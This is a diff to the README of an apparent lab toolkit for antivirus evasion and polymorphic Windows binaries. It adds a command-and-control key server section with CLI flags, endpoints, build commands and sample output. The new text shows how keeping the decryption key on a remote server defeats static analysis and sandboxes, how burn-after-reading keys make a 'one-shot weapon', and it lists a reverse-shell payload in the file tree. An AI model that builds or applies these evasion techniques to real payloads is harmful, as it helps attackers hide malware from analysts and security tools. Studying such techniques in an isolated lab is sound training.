@@ -16,11 +16,12 @@ Hidden-Bytes is a command-line toolkit written in Go, built for the HiddenBytes 
 3. [Requirements and setup](#3-requirements-and-setup)
 4. [Tool 1 — Evasion](#4-tool-1--evasion)
 5. [Tool 2 — Polymorphic](#5-tool-2--polymorphic)
-6. [End-to-end lab walkthrough](#6-end-to-end-lab-walkthrough)
-7. [Technical concepts](#7-technical-concepts)
-8. [Defensive analysis](#8-defensive-analysis)
-9. [Limitations](#9-limitations)
-10. [Ethics and lab safety](#10-ethics-and-lab-safety)
+6. [C2 Key Server — Remote key management](#6-c2-key-server--remote-key-management)
+7. [End-to-end lab walkthrough](#7-end-to-end-lab-walkthrough)
+8. [Technical concepts](#8-technical-concepts)
+9. [Defensive analysis](#9-defensive-analysis)
+10. [Limitations](#10-limitations)
+11. [Ethics and lab safety](#11-ethics-and-lab-safety)
 
 ---
 
@@ -76,10 +77,12 @@ hidden-bytes/
 │   │   ├── main.go           # CLI entry point
 │   │   ├── encrypt.go        # AES-256-GCM encryption, runner compilation, assembly
 │   │   └── runner.src        # self-extracting runner source (embedded, compiled at encryption time)
-│   └── polymorphic/
-│       ├── main.go           # CLI entry point
-│       ├── generate.go       # encryption, stub compilation, assembly
-│       └── stub.src          # self-modifying stub source (embedded, compiled at generation time)
+│   ├── polymorphic/
+│   │   ├── main.go           # CLI entry point
+│   │   ├── generate.go       # encryption, stub compilation, assembly
+│   │   └── stub.src          # self-modifying stub source (embedded, compiled at generation time)
+│   └── keyserver/
+│       └── main.go           # C2 key server — stores keys at encryption time, serves them at runtime
 ├── lab/
 │   ├── reverse_shell_payload.py
 │   ├── mal_demo.ps1
@@ -95,7 +98,7 @@ hidden-bytes/
 
 ### Building
 
-Both tools are built with standard `go build`:
+All tools are built with standard `go build`:
 
 ```bash
 # Build the evasion tool
@@ -103,6 +106,9 @@ go build -o evasion ./src/evasion/
 
 # Build the polymorphic tool
 go build -o polymorphic ./src/polymorphic/
+
+# Build the C2 key server (optional — only needed for remote key mode)
+go build -o keyserver ./src/keyserver/
 ```
 
 Each tool embeds its runner/stub source code and cross-compiles it to a Windows `.exe` at encryption/generation time, so Go must be installed when you run the tools.
@@ -148,6 +154,8 @@ Evasion Program Usage:
   --output  <output-binary>    Specify the output file path.
   --add-size <size-in-mb>      Increase the binary size (e.g., 101 MB).
   --delay   <seconds>          Execution delay in seconds (default: 101).
+  --c2-url <url>               Key server URL (e.g. http://192.168.56.1:8080).
+                               When set, the key is sent to the server and NOT stored in the file.
 ```
 
 ### 4.3 Walkthrough
@@ -395,6 +403,8 @@ Every run produces a **completely different file hash** while the behaviour stay
 Polymorphic Program Usage:
   --generate <output-binary>   Generate a polymorphic binary.
   --payload  <payload-file>    Embed the reverse shell payload.
+  --url <url>                  Key server URL (e.g. http://192.168.56.1:8080).
+                               When set, the key is sent to the server and NOT stored in the file.
 ```
 
 ### 5.3 Walkthrough
@@ -610,7 +620,169 @@ This is the property a defender looks for when comparing samples of the same mal
 
 ---
 
-## 6. End-to-end lab walkthrough
+## 6. C2 Key Server — Remote key management
+
+By default, both tools store the AES-256 key inside the output file's metadata trailer. This makes the file self-contained but means anyone who can read the file can extract the key and decrypt the payload.
+
+The **C2 key server** solves this: the key is sent to a server at encryption time and fetched by the runner at execution time. The output file contains only a `key_id` reference — no key, no nonce.
+
+### 6.1 Why remote keys matter
+
+| | Key in file (default) | Key on C2 server |
+|---|---|---|
+| **Static analysis** | Analyst reads the trailer → extracts key → decrypts payload | Analyst reads the trailer → finds only a `key_id` → cannot decrypt |
+| **Sandbox** | Sandbox runs the binary → it decrypts and executes | Sandbox runs the binary → cannot reach the server → decryption fails |
+| **Operator control** | None — the file is fully self-contained | Operator can shut down the server, restrict by IP, or burn keys after first use |
+
+### 6.2 Key server CLI reference
+
+```
+Usage:
+  keyserver --addr <host:port>          Listen address (default: 0.0.0.0:8080)
+  keyserver --addr <host:port> --burn   Delete each key after first fetch (burn-after-reading)
+```
+
+Endpoints:
+
+| Method | Path | Description |
+|--------|------|-------------|
+| `POST` | `/keys` | Store a key. Body: `{"key":"...","nonce":"..."}`. Returns `{"key_id":"..."}` |
+| `GET` | `/keys/{id}` | Fetch a key by ID. Returns `{"key":"...","nonce":"..."}`. With `--burn`: deletes after first fetch |
+| `GET` | `/keys` | List all stored key IDs. Returns `{"count":N,"keys":["..."]}` |
+
+### 6.3 Full walkthrough — Evasion with C2
+
+```bash
+# ── Terminal 1: Start the key server ──────────────────────────────
+go build -o keyserver ./src/keyserver/
+./keyserver --addr 0.0.0.0:8080
+# [KEYSERVER] Listening on 0.0.0.0:8080
+```
+
+```bash
+# ── Terminal 2: Build a test payload and encrypt with C2 ──────────
+go build -o evasion ./src/evasion/
+
+# Create a small Windows test binary
+cat > /tmp/hello.go << 'EOF'
+package main
+import "fmt"
+func main() { fmt.Println("Hello from hidden-bytes payload!") }
+EOF
+GOOS=windows GOARCH=amd64 go build -o hello.exe /tmp/hello.go
+
+# Encrypt with remote key
+./evasion --encrypt hello.exe --output evaded.exe --c2-url http://127.0.0.1:8080 --add-size 1 --delay 5
+```
+
+Expected output:
+
+```text
+[INFO] Key sent to server: key_id=638352027daaab68823167d4148cac38
+[INFO] Key is NOT stored in the output file.
+[INFO] Compiling runner stub for windows/amd64 ...
+[OK] Encryption is successful! Encrypted binary saved as "evaded.exe".
+```
+
+Verify no key in the file:
+
+```bash
+tail -c 200 evaded.exe | strings
+```
+
+```json
+{"key_id":"638352027daaab68823167d4148cac38","c2_url":"http://127.0.0.1:8080","delay":5,"original_name":"hello.exe","original_size":1904640,"ciphertext_len":1904656}
+HBX1
+```
+
+No `key` field, no `nonce` field — only a `key_id` and the server URL.
+
+Run the binary (while the key server is running):
+
+```bash
+wine ./evaded.exe
+```
+
+```text
+[INFO] Hidden-Bytes self-extracting runner.
+[INFO] Fetching key from C2 server...
+[INFO] Key retrieved from server.
+[INFO] Execution delayed by 5 seconds...
+[INFO] Binary decrypted successfully.
+[INFO] Target program executed.
+Hello from hidden-bytes payload!
+```
+
+Stop the key server and try again:
+
+```bash
+wine ./evaded.exe
+```
+
+```text
+[INFO] Hidden-Bytes self-extracting runner.
+[INFO] Fetching key from C2 server...
+[ERROR] cannot retrieve key: cannot reach key server at http://127.0.0.1:8080: ...
+```
+
+The binary is useless without the server.
+
+### 6.4 Full walkthrough — Polymorphic with C2
+
+```bash
+go build -o polymorphic ./src/polymorphic/
+
+./polymorphic --generate poly.exe --payload hello.exe --url http://127.0.0.1:8080
+```
+
+Each time the polymorphic binary runs, it re-encrypts with a fresh key and **pushes the new key to the server**. The old `key_id` is replaced with a new one in the metadata. The server accumulates one key per run.
+
+```bash
+# Check keys on the server
+curl -s http://127.0.0.1:8080/keys | python3 -m json.tool
+```
+
+```json
+{
+    "count": 2,
+    "keys": [
+        "638352027daaab68823167d4148cac38",
+        "42c4923f73c5abbe4a639b0a718f7ad9"
+    ]
+}
+```
+
+### 6.5 Burn-after-reading mode
+
+Start the server with `--burn` to delete each key after the first fetch:
+
+```bash
+./keyserver --addr 0.0.0.0:8080 --burn
+```
+
+The runner fetches the key once, the server deletes it immediately. A second run (or an analyst replaying the fetch) gets `404 Not Found`. This makes the binary a **one-shot weapon** — it works exactly once.
+
+### 6.6 Network setup for the lab
+
+```text
+┌──────────┐    Host-Only     ┌──────────┐
+│  Kali    │    Network       │ Windows  │
+│ (host)   │◄────────────────►│   VM     │
+│          │  192.168.56.0/24 │          │
+│ keyserver│                  │ evaded   │
+│ :8080    │◄─── GET /keys ───│ .exe     │
+└──────────┘                  └──────────┘
+```
+
+The VM must be in **Host-Only** mode so it can reach the key server on the Kali host but nothing else leaves the lab. Use the host's IP (e.g. `192.168.56.1`) as the `--c2-url`, not `127.0.0.1`.
+
+### 6.7 Backward compatibility
+
+Both tools work without `--c2-url` / `--url` — the key is stored in the file like before. The C2 mode is opt-in. Existing binaries generated without the flag continue to work unchanged.
+
+---
+
+## 7. End-to-end lab walkthrough
 
 ### Exercise A — Evasion: encryption, padding, delay
 
@@ -658,7 +830,7 @@ For each exercise, document:
 
 ---
 
-## 7. Technical concepts
+## 8. Technical concepts
 
 ### AES-256-GCM
 
@@ -694,7 +866,7 @@ A reverse shell has the target initiate an outbound TCP connection and feed a co
 
 ---
 
-## 8. Defensive analysis
+## 9. Defensive analysis
 
 These techniques illustrate patterns that defenders can investigate:
 
@@ -715,7 +887,7 @@ Recommended controls: application allowlisting, least privilege, egress filterin
 
 ---
 
-## 9. Limitations
+## 10. Limitations
 
 1. **Detection results are measured, not engineered.** Report the Defender and VirusTotal numbers you actually observe.
 2. **The runner launches the payload as a child process.** There is no process hollowing, injection, or concealment.
@@ -728,7 +900,7 @@ Recommended controls: application allowlisting, least privilege, egress filterin
 
 ---
 
-## 10. Ethics and lab safety
+## 11. Ethics and lab safety
 
 Binary encryption, file mutation, self-modification, and reverse shells are dual-use techniques. The skills learned here are the same ones used by red team professionals, malware analysts, security researchers, and antivirus developers.
 
